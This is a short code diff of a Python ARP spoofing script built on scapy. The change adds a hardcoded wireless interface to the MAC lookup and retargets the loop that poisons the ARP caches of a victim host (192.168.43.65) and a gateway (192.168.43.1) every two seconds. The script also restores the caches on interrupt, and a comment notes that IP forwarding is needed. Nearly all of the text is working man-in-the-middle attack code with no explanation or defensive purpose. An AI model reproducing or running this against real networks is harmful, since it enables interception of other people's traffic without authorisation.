@@ -6,7 +6,7 @@ def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
     arp_request_broadcast = broadcast/arp_request
-    answered, unanswered = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)
+    answered, unanswered = scapy.srp(arp_request_broadcast, timeout=3, verbose=False, iface="wlp2s0")
 
     return answered[0][1].hwsrc
 
@@ -30,14 +30,14 @@ packets = 0
 
 try:
     while True:
-        spoof('192.168.43.70', '192.168.43.1')
-        spoof('192.168.43.1', '192.168.43.70')
+        spoof('192.168.43.65', '192.168.43.1')
+        spoof('192.168.43.1', '192.168.43.65')
         packets += 2
         print('\rSent Packets: ' + str(packets), end='')
         time.sleep(2)
 except KeyboardInterrupt:
     print('\nCtrl C detected....quiting')
-    restore('192.168.43.70', '192.168.43.1')
-    restore('192.168.43.1', '192.168.43.70')
+    restore('192.168.43.65', '192.168.43.1')
+    restore('192.168.43.1', '192.168.43.65')
 # enable ip forwarding loops video.
 
